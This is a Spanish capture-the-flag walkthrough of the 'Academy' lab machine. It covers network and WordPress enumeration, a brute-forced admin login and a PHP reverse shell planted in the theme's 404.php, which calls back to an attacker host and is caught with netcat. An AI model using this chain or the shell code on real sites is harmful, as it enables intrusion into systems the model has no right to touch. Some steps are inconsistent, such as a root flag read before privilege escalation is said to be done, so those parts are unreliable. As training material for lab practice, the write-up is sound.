# Write-Up: Academy - The Hackers Labs

>

## Información General

- **Nombre de la máquina**: Academy
- **Plataforma**: The Hackers Labs
- **Dificultad**: Intermedio
- **Sistema Operativo**: Linux
- **CMS**: WordPress 6.5.3
- **Objetivos**: Obtención de la Flag de usuario y de root
- **Fecha de resolución**: Julio de 2026

---

## FASE 1: ENUMERACIÓN

### Descubrimiento de Hosts

```bash
sudo netdiscover -r 10.0.2.0/24
```

**Resultado:**
Se localizó la máquina objetivo en la red local.

**Nota:** netdiscover usa ARP, que no funciona en entornos cloud como AWS.

---

### Descubrimiento de Puertos

```bash
sudo nmap -sV -p- IP_DE_LA_MAQUINA
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH |
| 80/tcp | HTTP | Apache | Apache httpd |

**Análisis:**
- Puerto 22: SSH — posibles vulnerabilidades
- Puerto 80: Servidor web Apache — punto de entrada principal

---

## FASE 2: ENUMERACIÓN WEB

### Fuzzing de Directorios

```bash
dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:**
- `/wordpress` (código 301, redirección)
- `wp-login.php`
- `wp-content/uploads`

**Análisis:**
- El flag `-r` activa la **enumeración recursiva**
- Sin recursividad no se habrían descubierto las rutas internas
- `/wordpress` redirige a un dominio → necesita `/etc/hosts`

---

### Configuración de /etc/hosts

```bash
sudo nano /etc/hosts
```

Añadir la línea:
```
IP_DE_LA_MAQUINA academy.thehackerlabs
```

**Análisis:**
- WordPress usa el dominio `academy.thehackerlabs`
- Sin esta configuración, el navegador y WPScan no resuelven el dominio
- La redirección 301 causa que las herramientas fallen

---

## FASE 3: EXPOSICIÓN

### WPScan: Detección del CMS

```bash
wpscan --url http://academy.thehackerlabs/wordpress
```

**Resultado:**
- WordPress **versión 6.5.3**
- Presencia de `xmlrpc.php`
- Presencia de `readme.html`
- Directorio `wp-content/uploads` accesible

**Análisis:**
- La versión ya se puede buscar vulnerabilidades
- `xmlrpc.php` es una API antigua (descartada en esta auditoría)
- Siempre apuntar al directorio `/wordpress`, no a la raíz

---

### WPScan: Enumeración de Usuarios

```bash
wpscan --url http://academy.thehackerlabs/wordpress -e u
```

**Resultado:**
Se enumeraron los usuarios válidos del WordPress.

**Análisis:**
- El flag `-e u` enumera usuarios
- Se puede usar un diccionario de nombres con `-U`
- La enumeración por mensajes de error del login también funciona

---

### WPScan: Enumeración de Plugins

```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
```

**Resultado:**
- Se detectó el plugin **Elementor**

**Análisis:**
- Sin API token, WPScan solo **lista** plugins y versiones
- Con API token, WPScan añade los **CVE** asociados
- El API token se obtiene gratis en wpscan.com

---

### WPScan: Plugins Vulnerables con API Token

```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}
```

**Resultado:**
Se listaron vulnerabilidades con sus CVEs.

**Análisis:**
- No toda vulnerabilidad listada es explotable
- Muchas requieren autenticación o un rol concreto
- El auditor debe entender en qué endpoint aplica cada CVE

---

### WPScan: Fuerza Bruta (Último Recurso)

```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
Usuario: Dylan
Contraseña: password1
```

**Análisis:**
- La fuerza bruta es el **último recurso**: es ruidosa y poco fiable
- En WordPress se prefiere WPScan frente a Hydra o Burp Intruder
- Wordfence (plugin "antivirus/WAF") limita intentos de login
- `password1` es una contraseña típica de rockyou.txt

---

## FASE 4: ACCESO INICIAL

### Login al Panel de WordPress

```bash
# Acceder a http://academy.thehackerlabs/wp-admin
# Iniciar sesión con: Dylan / password1
```

**Resultado:**
Se accedió al panel de administración de WordPress.

---

### RCE: Reverse Shell por Editor de Temas

**Pasos:**
1. Ir a **Apariencia → Editor de temas**
2. Seleccionar la plantilla **`404.php`**
3. Pegar una **reverse shell PHP**:

```php
<?php
$sock = fsockopen("IP_KALI", 1234);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

4. Guardar cambios

**Análisis:**
- La plantilla debe ser **PHP** (no HTML)
- Si es HTML, el código PHP no se ejecuta
- Apache/Linux → PHP; IIS/Windows → ASP.NET

---

### Reverse Shell: De HTTP a TCP

**En Kali (listener):**
```bash
nc -lvnp 1234
```

**Disparar la shell:**
Visitar `http://academy.thehackerlabs/wordpress/404.php` en el navegador.

**Resultado:**
```
connect to [IP_KALI] from (UNKNOWN) [IP_MAQUINA] xxxx
bash: no hay control de trabajos en este shell
www-data@academy:~$
```

**Análisis:**
- El tráfico cambia de HTTP a TCP
- Una vez dentro, el WAF (Wordfence) ya no protege
- Actúa a nivel de aplicación; dentro solo queda el firewall del sistema

---

### Estabilización de la Shell

```bash
# En la shell reverse
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z para suspender
# En Kali:
stty raw -echo; fg

# Presionar Enter
whoami
id
```

**Resultado:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Análisis:**
- La shell inicial es limitada
- La estabilización permite usar comandos como `clear`, `vim`, etc.
- Somos el usuario `www-data` — acceso inicial conseguido

---

## FASE 5: FLAGS

### User Flag
```bash
cat /home/USUARIO/user.txt
```

### Root Flag
```bash
/bin/bash -p
cat /root/root.txt
```

**Nota:** La escalada de privilegios a root quedó pendiente para el módulo de escalada.

---

## CADENA DE EXPOLOTACIÓN COMPLETA

```
┌─────────────────────────────────────────────────────────┐
│ 1. netdiscover → localizar host │
│ 2. nmap → puertos 22 y 80 │
│ 3. dirsearch -r → /wordpress │
│ 4. /etc/hosts → academy.thehackerlabs │
│ 5. WPScan → WordPress 6.5.3 │
│ 6. WPScan -e u → enumerar usuarios │
│ 7. WPScan --enumerate ap → enumerar plugins │
│ 8. WPScan brute force → Dylan / password1 │
│ 9. Login /wp-admin → panel de administración │
│ 10. Editor de temas → reverse shell PHP en 404.php │
│ 11. Netcat → shell www-data │
│ 12. Estabilización TTY → acceso inicial │
└─────────────────────────────────────────────────────────┘
```

| Fase | Técnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | ARP scan, port scan | netdiscover, nmap |
| Enumeración web | Fuzzing recursivo | dirsearch, Gobuster |
| Enumeración CMS | WPScan | WPScan |
| Acceso | Fuerza bruta WordPress | WPScan, rockyou.txt |
| Explotación | RCE por editor de temas | WordPress, Netcat |

---

## HERRAMIENTAS UTILIZADAS

| Herramienta | Propósito |
|-------------|-----------|
| netdiscover | Localizar hosts en la red (ARP) |
| nmap | Escaneo de puertos y servicios |
| dirsearch | Fuzzing de directorios recursivo |
| WPScan | Auditoría de WordPress |
| Burp Suite | Inspección de cabeceras y cookies |
| SecLists | Diccionarios de usuarios |
| rockyou.txt | Diccionario de contraseñas |
| Netcat | Listener de reverse shell |

---

## ERRORES Y PROBLEMAS ENCONTRADOS

### Error 1: WPScan no encuentra rutas
- **Problema:** Sin el flag `-r`, WPScan no enumera dentro de `/wordpress`
- **Causa:** Faltaba enumeración recursiva
- **Solución:** Usar `dirsearch -r` o el flag recursivo de la herramienta

### Error 2: Redirección 301
- **Problema:** `/wordpress` devuelve 301 Moved Permanently
- **Causa:** WordPress usa el dominio `academy.thehackerlabs`
- **Solución:** Añadir IP + dominio en `/etc/hosts`

### Error 3: WPScan sin API token no muestra CVEs
- **Problema:** Solo lista plugins sin vulnerabilidades
- **Causa:** Sin token, WPScan no consulta la base de datos de vulnerabilidades
- **Solución:** Registrar token gratis en wpscan.com

### Error 4: Vulnerabilidad listada no es explotable
- **Problema:** Muchos CVEs requieren autenticación o rol específico
- **Causa:** No todas las vulnerabilidades son accesibles desde el exterior
- **Solución:** Verificar endpoint y contexto antes de invertir tiempo

### Error 5: Webshell en lenguaje equivocado
- **Problema:** Si la plantilla es HTML, el código PHP no se ejecuta
- **Causa:** El servidor solo ejecuta PHP en archivos `.php`
- **Solución:** Buscar una plantilla `.php` (como 404.php)

---

## LECCIONES APRENDIDAS

1. **WordPress = plugins, no núcleo:** El peligro está en los plugins, no en el core
2. **WPScan es esencial:** Versión, usuarios, plugins y CVEs en una herramienta
3. **Enumeración antes de fuerza bruta:** La fuerza bruta es el último recurso
4. **API token marca la diferencia:** Sin token solo listas; con token obtienes CVEs
5. **Recursividad en fuzzing:** Sin `-r` no encuentras rutas internas
6. **/etc/hosts es necesario:** Muchas máquinas usan dominios que no resuelven
7. **Editor de temas = RCE:** PHP en 404.php es una vía clásica de acceso
8. **HTTP → TCP:** La reverse shell cambia el protocolo de conexión
9. **Estabilizar la shell:** La shell inicial es limitada; hay que estabilizarla

---

## REFERENCIAS

- [WPScan Documentation](https://wpscan.com/documentation)
- [HackTricks - WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-wordpress)
- [GTFOBins](https://gtfobins.github.io/)

---

*Write-up creado el 13 de Julio de 2026*
